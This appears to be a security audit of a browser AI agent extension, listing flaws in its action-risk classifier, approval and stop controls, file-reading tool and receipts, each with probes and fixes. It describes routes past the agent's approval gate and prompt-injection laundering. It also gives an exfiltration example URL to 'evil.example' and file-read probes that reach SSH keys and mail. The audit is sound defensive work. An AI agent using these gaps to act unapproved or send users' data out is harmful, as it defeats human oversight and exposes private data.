## 1. Agent mode safety

### 1.1 Empty-label buttons skip the structural HIGH rule (high, observed)
`act-risk.ts:79` `hasWords(hay, "")` is always true (`"x".includes("")`), so `taskNames(task, "")` (`:85-86`) says the person
named the control, and `structuralHigh` (`:76`) returns false. Probe: a button with label `""` on a page with an input
classifies **medium** (`withform=medium`), while `"➤"` classifies high. Exploit: an icon-only Send / Pay button with no
aria-label (common in chat apps and wallets) is clicked with no Approve. Fix: in `taskNames` and `hasWords`, return false for
an empty or whitespace needle; treat an unlabelled button on a form as HIGH.

### 1.2 SAFE_LABEL prefix makes destructive buttons medium (high, observed)
`act-risk.ts:26` matches the FIRST word only. Probe results with a form on the page: `Cancel subscription`, `Close account`,
`Clear all data`, `Reset all settings` are all **medium**. Fix: SAFE_LABEL must match the whole label (anchor `$` after an
optional short object like "dialog"), and add `account|subscription|data|all|history|plan|membership` as HIGH objects after
cancel/close/clear/reset.

### 1.3 Labels outside the English/Roman-Hinglish list are medium on pages with no input (high, observed)
`act-risk.ts:15-23`. With no editable control on the page, all of these are **medium**: `भेजें`, `जमा करें`, `भुगतान करें`,
`खरीदें`, `हटाएं`, `bhej dijiye`, `jama kijiye`, `Kaufen`, `Envoyer`, `Enviar`, `Comprar`, `支付`, `Sign`, `Accept`, `I agree`,
`OK`, `Yes`, `Proceed`, `Continue`, `Reply`, `Comment`, `Repost`, `Merge pull request`, `Vote`, `Claim`, `Stake`, `Bridge`,
`Bid`, `Archive`, `Leave group`, `Block`, `Execute`, `Run`, the homoglyph `Dеlete` (Cyrillic е) and the soft-hyphen
`Sub­mit`. One-click dApp pages (Claim, Stake, Sign) often have no input. Fix: (a) NFKC-normalise, strip soft hyphens and
zero-width characters, and map common homoglyphs before matching; (b) add Devanagari verbs and the polite Hinglish forms
(`-iye`, `kijiye`, `dijiye`); (c) invert the default: on any page, a button whose label is not in SAFE_LABEL and not plainly
navigational is HIGH, not only on pages with an input.

### 1.4 Keyboard paths around HIGH (high, observed + derived)
- `shift+enter` on a focused **Pay** button: **medium** (probe). The browser executor then clicks it: `act.js:420` calls
  `a.click()` for Enter on a focused button whatever the modifiers. Same for `shift+space` (`act.js:424`; classify treats it
  as an ordinary key, `act-risk.ts:199`). Chain: `key tab` (low) to focus Pay, then `key shift+enter` (medium). Fix: in
  `classify`, strip modifiers before the Enter/Space rules; in `doKey`, refuse to `click()` when any modifier is held.
- `ctrl+enter` in a textarea: **medium** ("a new line", `act-risk.ts:188`). GitHub, Slack and many web apps send on
  Ctrl+Enter, and synthetic keydown events are seen by page JS handlers. Fix: treat `ctrl+enter`, `cmd+enter`, `alt+enter`
  in any text field as HIGH.
- Enter in a field when the only button is `Next`/`Proceed`: **medium** (probe), and `act.js:421-422` then calls
  `form.requestSubmit()`. Clicking that same button would be HIGH by the structural rule. Fix: Enter in a field inside a
  `<form>` with any button is HIGH (same rule as the click).

### 1.5 Model text is laundered into "the person's task" across page loads (high, derived + observed)
`act.js:204-207` `continuation()` appends `history` to the task, and `history` is `J.say` (`act.js:704`), which is the
model's own `say` text (`act.js:675`), not "our own short step names" as the comment says. On resume the helper treats the
whole string as the person's words: `classify(..., state.task)` uses it in `taskNames` (structural rule), in `pageAskedFor`
(`act-risk.ts:102`, the injection refusal), in `hasWords(task, action.text)` (secret-shaped typing, `:167`), and in
`hasWords(task, host)` (open_url risk, `:207-210`). Probe: a `Proceed` button on a form is HIGH for task "fill my email"
and **medium** for `fill my email\n\n(Already done on earlier pages: Pressing "Proceed".)`. Exploit: injected page text gets
the model to say a label or host once; after the next navigation that label/host counts as named by the person. Fix: send
history as a separate `history` field the helper puts inside the fence, never concatenated into `task`; classify only on the
original task text.

### 1.6 Caps reset on every page load (high, derived)
Each page load in a task calls `resume()` (`act.js:797-807`) which starts a new run with a new `actId` (`act.js:631`), and
the helper keeps steps and time per actId (`act-route.ts:187-188`, `act-loop.ts:114-115`). The extension's own checks are
`done >= 25` only at resume (`act.js:801`) and a 4-minute timer per page (`act.js:517`, `:635`), with a 10-minute state TTL.
So a task that navigates can run 24 + 25 actions and up to 10 minutes. The 5-minute relay cap in `background.js:261` is also
per page. Fix: carry `startedAt` and a step count into the helper on resume and enforce 25 / 3 min there, or keep one actId for
the whole task.

### 1.7 Acting without being armed, and stop gaps during navigation (high, derived)
- Arming is browser-wide and sticky: `agentOn` lives in `chrome.storage.session` for every tab (`background.js:128-129`) with
  no timeout; AGENT-MODE.md says "per session". Fix: arm per tab, auto-disarm after 10 minutes idle.
- `resume()` sets `agentOn = true` unconditionally (`act.js:802`). Scenario: a task navigates tab A; the person turns Agent
  mode off in tab B (Option+Shift+A); tab A finishes loading and the task carries on. `setAgent(false)` (`act.js:786-793`)
  only stops the run in the tab where it was pressed and does not clear other tabs' saved state. Fix: `resume()` must check
  `agent-get` and refuse when off; disarming must clear every `act:*` key.
- Esc pressed between unload and the next page's content script (`run_at: document_idle`, can be seconds) goes to a page with
  no listener, and `resume()` then starts the task again. Same for a tab switch (`background.js:243`). Fix: a stop flag in
  `chrome.storage.session` set by a browser-level command (see 1.8) that `resume()` checks; register `chrome.commands` so Stop
  works with no content script.

### 1.8 The page controls the approval and stop UI (high, inferred)
- The pill and its Approve/Deny/Stop buttons live in the page's DOM (`overlay.js:12-14`, closed shadow root). Closed shadow
  stops the page reading it, not hiding it: page JS can find `[data-ishara-root]` and set `display:none`, and draw its own
  look-alike pill. `handleKey` (`act.js:776-783`) approves on any trusted `y` keydown in the tab. Exploit: hostile page hides
  the real pill when an approval for "Pay" is pending and shows a fake "Scroll down? press Y"; the person presses Y and the
  real HIGH action is approved.
- `y` also approves while the person is typing in any field (`content.js:317` runs before any focus check). Typing "you" in
  another box during a pending approval approves it.
- The content listener is a capture listener on `window` added at `document_idle` (`content.js:372`). A page capture listener
  on `window` registered earlier runs first and can `stopImmediatePropagation()` on Escape and on clicks, so Esc and the Stop
  button can be swallowed. Then only closing the tab or the 4-minute timer stops the task.
- Fix: put Approve and Stop in extension-owned UI (side panel, popup, or a `chrome.notifications` button) and register a
  `chrome.commands` shortcut for Stop; drop the Y/N keys, or accept them only when focus is not in an editable element and the
  pill was visible (IntersectionObserver on the host) for at least 500 ms.

### 1.9 Approval is decided in the client, not confirmed by the helper (medium, derived)
On Approve the client posts `/act/approve` fire-and-forget and executes at once (`act.js:718-727`). If the helper already
timed the approval out (helper timer starts before the client's, which starts after the 700 ms point wait), the helper logs
`NOT APPROVED` and ends, but a click in that gap still runs locally. The receipt then says the opposite of what happened. Also
`answerApproval` stores approvals for future steps up to `steps + 2` (`act-route.ts:59`), so any local process that knows an
actId can pre-approve. Fix: execute only after the helper answers `{ok:true, approved:true}` for that n; drop early approvals
for steps that have not asked.

### 1.10 The executor does not re-check the label it was approved on (medium, derived)
`classify` runs on the context the client sent; the click runs later on `elementFor(id)` (`act.js:535-545`, `:471-476`) with no
label comparison, after a 700 ms cursor glide (`act.js:683`). A page that relabels a button on hover from "Details" to "Pay"
gets a medium click. Fix: in `run()`, compare `visibleLabel(el)` and role with the classified label; on change, fail the step
with "the control changed" so the helper re-plans.

### 1.11 Data leaves through actions that need no Approve (medium, observed)
`search` is **low** for any query (probe: `"order 4411 card ending 4242 address 12 MG road"` = low); `open_url` to a host not
on the page is **medium** (probe, `https://evil.example/?d=secret`); `type` into any non-secret field is medium, and the
page's own JS reads input events, so typing a value into an attacker's field is exfiltration with no submit. Fix: search query
and open_url query string must be words from the task (or the person's answer); otherwise HIGH and show the full URL in the pill.

### 1.12 Injection through page text: what I tried
Page text cannot start a task: `isTask` runs only on the person's typed or spoken words (`content.js:84`), the dev hook is
limited to `http://127.0.0.1:7777/test/` (`act.js:812`), and pages cannot message the worker (no `externally_connectable`)
(derived). Inside a task, page text reaches the model fenced (`act-prompt.ts:114-120`), and `pageAskedAction` refuses
actions whose target is named only in text matching `INSTRUCTION_TEXT`. Gaps: 1.5 (laundering), executor `detail` strings
with page labels and tab titles go OUTSIDE the fence in history (`act.js:277`, `background.js:245`, `act-prompt.ts:123`), and
any instruction not phrased to "an assistant" is not tainted at all (`pointer-gate.ts:50-57`). Fix: put history results
inside the fence too.

## 2. New actions

### read_file (`helper/src/act-files.ts`)
Probe with a fake home (`files-probe.ts`), real `fs`:
| Path | Result |
|---|---|
| `~/.ssh/id_ed25519` | refused |
| `~/Documents/notes.txt` (symlink to `~/.ssh/id_ed25519`) | refused (realpath works) |
| `~/Documents/hard.txt` (**hard link** to `~/.ssh/id_ed25519`) | **READ**, full content |
| `~/Documents/id_rsa` (a copy of a key) | **READ** |
| `~/Documents/credentials` (AWS file) | READ, both keys redacted |
| `~/Documents/todo.txt` "my bank password is hunter2, pin 4411, card 4111..." | READ, only the card redacted |
| `~/Library/Mail/V10/msg.emlx` "Your OTP is 482913" | **READ** |
| `~/library/KEYCHAINS/x`, `~/Documents/../.ssh/...`, `/etc/passwd` | refused |
| `~/Documents/kеy.txt` (Cyrillic е) | READ (the name rule is ASCII) |
- (high, observed) Hard links and copied keys pass. `SECRET_NAME` (`:14`) lacks `id_rsa|id_ed25519|id_ecdsa|credentials|
  \.p12|\.pfx|\.keystore|\.kdbx|keychain|passwd|mnemonic|private`. Fix: add those; refuse a file whose `nlink > 1`; refuse
  content that starts with `-----BEGIN` and contains `PRIVATE KEY`.
- (high, observed) `~/Library` is open except Keychains: Mail (`.emlx` is text), Messages exports, browser profile JSON, app
  tokens under `Application Support`. Fix: refuse all of `~/Library` except an allowlist, or allow only `~/Documents`,
  `~/Desktop`, `~/Downloads`.
- (medium, observed) Redaction misses (`pem.ts`): a PEM's last base64 line (`AAAAZ29vZA==`) and BEGIN/END lines; an
  UPPERCASE seed phrase; a hyphen-joined seed phrase; a 64-hex key split in two 32-hex halves; prose passwords; Aadhaar
  (`2345 6789 0123`) and PAN (`ABCDE1234F`). These are the same rules as page text (`blocks-core.js:29-65`), so they apply to
  the tutor too. Fix: lower-case before the phrase-run check, split on `-_,` too, mask any line inside a PEM block, add
  Aadhaar/PAN/UPI-PIN shapes, mask "password/pin/otp is X" spans.
- (low, inferred) TOCTOU: `realpath`, `stat`, then `open(path)` (`:61`, `:74-81`) follows symlinks at open time. A local
  process can swap the file for a link between check and read. Needs local write access, so low. Fix: `open` with
  `O_NOFOLLOW`, then `fstat` the handle and compare `ino/dev` with the checked `stat`.
- Huge, binary and non-UTF-8 files: refused correctly (`:80-85`, derived; covered in `act-tools.test.ts`).
- Redaction before the model: yes, `d.redact` runs before `data` is returned (`:86`), and `data` goes only into the fenced
  prompt (`act-prompt.ts:119`). Not in SSE `result`, receipts or the log (`act-loop.ts:242-244`; derived). But the model can
  copy file text into `type`, `copy` or `search`, and `describeAction` puts the first 60 characters of those into receipts
  (`act-loop.ts:241`, `act-prompt.ts:101-103`), which go into the episode log. So "content never lands in receipts" holds
  only for the read itself.

### search
Engines are a fixed table and the query is `encodeURIComponent`-ed in both helper (`act.ts:72-80`) and extension
(`act.js:56-58`, unknown engine falls back to brave); a non-http(s) URL cannot be produced (tried `engine` values and control
characters, derived). Page data can reach the query: see 1.11.

### tab
- (medium, derived) `cmd+w` closes the task's own tab: `doKey` maps it to `close_tab` (`act.js:160`) and the worker closes
  `sender.tab` (`background.js:182`). It is HIGH and needs Approve, but AGENT-MODE.md says closing Ishara's own tab is refused
  "whatever the approval". Fix: refuse `close_tab` in the worker, as `tab close` already does (`background.js:224-231`).
- (medium, derived) `tab close` risk looks at the CURRENT page for wallet signs (`act-risk.ts:218`), not the tab being closed.
- (medium, inferred) Wrong tab after a switch: the old tab keeps its `runState` and its stream until `resume()` in the new tab
  posts `/act/stop` (400 ms + message + 500 ms later, `background.js:243`, `act.js:804`). With a fast planner (the fake router
  answers in milliseconds) the old background tab can receive and execute the next action. Fix: after `tab_op switch`
  succeeds, the old tab must end its run itself before reporting the result.
- Tab titles are page-controlled and are used for `match` (`background.js:210-213`); ambiguity fails, which is correct, but
  a page can title itself to win a match. Low.
- (medium, inferred) back/forward: `env.tab` sleeps 8 s and reports "the page did not change" (`act.js:561-566`). A same-
  document navigation (SPA, hash) never unloads, so a successful back is reported as failed after 8 s. A back to a page served
  from the back/forward cache restores the old script without running `content.js`, so `resume()` never runs and the task
  hangs or ends "lost its connection". No `pageshow` handler anywhere (grep). Fix: listen for `pageshow` with `persisted`, and
  have the worker confirm navigation with `chrome.webNavigation`/`tabs.onUpdated` instead of a blind 8 s sleep.
- act-resume path: only accepted from this extension's id and only when idle (`act.js:845`); a page cannot send it (derived).

## 3. Tab and mic routing
Guard as built: `content.js:316` (visible and focused), `background.js:54-60` (active tab of the last focused window, one
recorder, 30 s stale takeover). Paths I checked:
- Two tabs, same window: only the active one passes `rec-start`. Covered (derived).
- Two windows side by side: both visible, only one `hasFocus()`; `lastFocusedWindow` agrees. Covered (derived).
- Focus in an iframe: the child relays the chord through the worker to frame 0 of the SAME tab (`background.js:83-85`); top
  `document.hasFocus()` is true when focus is in a child frame. Correct (derived).
- `chrome.tabs.query` fails or returns nothing (focused window is a DevTools or popup window): the check falls through
  (`background.js:57-58`) and the single-recorder rule is the only guard. Low.
- A take older than 30 s is treated as stale, so a second tab can start while the first still records into the same
  offscreen recorder; whichever releases first gets the audio. Low.
- Two Chrome profiles: two extension instances, two offscreen recorders, one helper. Both can record if the person presses the
  chord in each window within a take (each profile's guard sees only its own tabs). Answers are per tab port, but speech is
  global in the helper: any profile's new question cuts the other's voice (`content.js:86,92,282`). Low.
- Desktop and browser together: holding Right Option in a browser still opens the desktop mic (the take is discarded,
  `desktop-ptt.ts:134-147`). Low.
- **Root cause:** not identified. Neither the commit `2c2b966` nor the code says how a background tab got a chord; the fix
  refuses the symptom at two points. Treat it as guarded, not fixed. To find it: log `sender.tab.id`, `sender.frameId`,
  `document.visibilityState` and the chord source on every `rec-start` and reproduce with 3-4 tabs.
- No test covers `background.js` or `content.js` (section 7).

## 5. Receipts
- (high, derived) **Logs reach 0G only from the debug panel.** `endSession` is called only by `overlay.js:538` (Option+Shift+D)
  and `content.js:359-363`. A new `sessionId` is made on every page load (`content.js:29`), so a normal browsing session is many
  sessions, none uploaded unless the person opens the debug panel on each page. README line 38-39 "At the end of a session the
  log is encrypted, stored on 0G Storage, and its root is written to a contract" describes a hidden manual step. Fix: end and
  upload on `pagehide` / tab close / idle, from the worker, or say "when you press End session".
- (medium, derived) The proof ignores `teeSignerAcknowledged` and `verifiability`, both read from the contract
  (`proof.ts:28`, `:57`). "Checked against the signer registered on-chain" is true; "a sealed provider" is not checked by code.
  Fix: require `teeSignerAcknowledged === true` and a TEE `verifiability` value, else status "unattested".
- (medium, derived) The signed `text` is never parsed (`proof.ts:97-99`): nothing ties it to this `chatId`. A provider could
  return any old signed text. PROOF_NOTE says it does not prove the words, but README line 38 and proof.html:21 say "answered
  this request". Fix: parse `text` and require it to contain the chat id (or document what it contains).
- (low, derived) The 20-minute window is handled: fetch right after each answer, three tries (`episode-log.ts:111-131`). If the
  helper restarts within 20 minutes, `pending` proofs are never retried (only in-memory jobs). Fix: on load, retry `pending`
  entries younger than 20 minutes.
- (low, derived) Replay compares the chain root with the LOCALLY stored root, and the hash with the locally stored hash
  (`episode-log.ts:202-213`). Only this laptop can replay (the key is local). README "replay ... verifies it" should say "on
  the laptop that made it". The contract does not record who may write (`SessionRoot.sol:11-16`) and replay does not check
  `recorder`. Low.
- (medium, observed in the test run) The live provider-record test for the laya address `0x743c...` reverts on-chain
  (`execution reverted`) and is reported as **skipped "RPC unreachable"** (`proof.test.ts:46-53`). It hides a real change
  (provider re-registered on 6 Nov). Fix: skip only on network errors; fail on revert.
- Agent mode in the log: one entry per task with every action, risk, "approved" / "NOT APPROVED" / REFUSED, and the 0G ids
  (`act-loop.ts:97-108,169,223,241`; tests in `act-loop.test.ts`, `act-route.test.ts`). Gaps: (a) the browser splits one task
  into one entry per page, the earlier ones logged as `act-stopped` "Stopped. I did not do anything more." (`act.js:804`)
  although the task went on; (b) the navigating action is logged `interrupted`, not `ok` (`act-loop.ts:236-239`); (c) see 1.9,
  a client-side approval can disagree with the log; (d) typed text, copied text and search queries (60 chars) are in the log.

## (c) The three tracks
**0G Physical AI (Agents with a Body).** The "body" is a cursor and two executors (browser DOM, macOS Accessibility), with
sealed planning, laya checking each target, and a per-action receipt. That is real code. A skeptical judge will say this is a
computer-use agent, not physical AI, and will ask for the Agent eval on the real router: there is one saved case, and it
failed. The safety story is the selling point, and section 1 shows it can be walked around.
**Build with 0G PC.** Best supported: every model call goes through the Router in `private` mode, two sealed models are used
for different jobs, signatures are fetched within the 20-minute window and checked against the on-chain signer, and the log
goes to 0G Storage with its root on a contract. A skeptic will note that `private` is a request header the code trusts, that
`teeSignerAcknowledged` and `verifiability` are read but never checked, that the proof does not bind the words or even the
chat id, and that storage and the contract are on Galileo testnet while compute is mainnet.
**EF Best CROPS App.** P is mostly backed: local speech, no trackers (grep), redaction in tab and helper, key never in the
extension. But a skeptic will find that Agent mode sends text to search engines and arbitrary hosts without asking, that the
redaction misses uppercase or hyphenated seed phrases, split keys and Aadhaar/PAN (pointed for a Mumbai event), that
receipts need a hidden debug button, that every question is logged to disk without being mentioned, and that C depends on a
single 0G Router and a testnet. The README's S paragraph overclaims Agent mode safety; fixing lines 71-72 is the cheapest
credibility win.
